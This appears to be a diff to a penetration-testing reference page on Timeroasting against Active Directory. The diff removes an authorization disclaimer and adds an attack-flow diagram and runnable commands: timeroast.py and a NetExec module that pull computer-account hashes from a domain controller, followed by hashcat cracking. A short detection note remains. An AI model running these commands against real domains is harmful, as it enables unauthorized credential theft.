@@ -10,24 +10,38 @@ mitre: "T1110"
 tag: "new"
 ---
 
+
 # Timeroasting
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **MS-SNTP authentication** — computer and trust accounts.
 
-## Detection
+### Concept (deep)
+MS-SNTP auth uses a checksum keyed by the **computer account password**. Unauthenticated crafted NTP requests to a DC yield `$sntp-ms$` hashes for **all computer accounts** (and sometimes gMSA) → crack with hashcat **31300**.
+
+### Attack flow (Mermaid)
+```mermaid
+sequenceDiagram
+    participant A as unauthenticated attacker
+    participant DC
+    A->>DC: Crafted MS-SNTP request (RID)
+    DC-->>A: $sntp-ms$ hash
+    A->>A: hashcat -m 31300
+```
+
+### Commands
+```bash
+# ── Extract hashes ──────────────────────────────────────────────────
+sudo ./timeroast.py 10.0.10.5 | tee ntp.txt
+
+# ── Or NetExec module ────────────────────────────────────────────────
+nxc smb 10.0.10.5 -u '' -p '' -M timeroast
+
+# ── Crack ────────────────────────────────────────────────────────────
+hashcat -m 31300 ntp.txt rockyou.txt
+```
+
+### Detection
 NTP requests from non-DC hosts with malformed/auth extensions; monitor **UDP 123**; rotate machine passwords (default 30 days helps).
 
 ---
-
-## References
-
-- [Microsoft: Windows Time service](https://learn.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-topology)
-- [Microsoft: Windows Time service tools](https://learn.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings)
-- [Microsoft: Credential Guard](https://learn.microsoft.com/windows/security/identity-protection/credential-guard/credential-guard)
-- [Microsoft: Credential protection](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/credential-protection-and-management)
-- [MITRE ATT&CK: T1110](https://attack.mitre.org/techniques/T1110/)
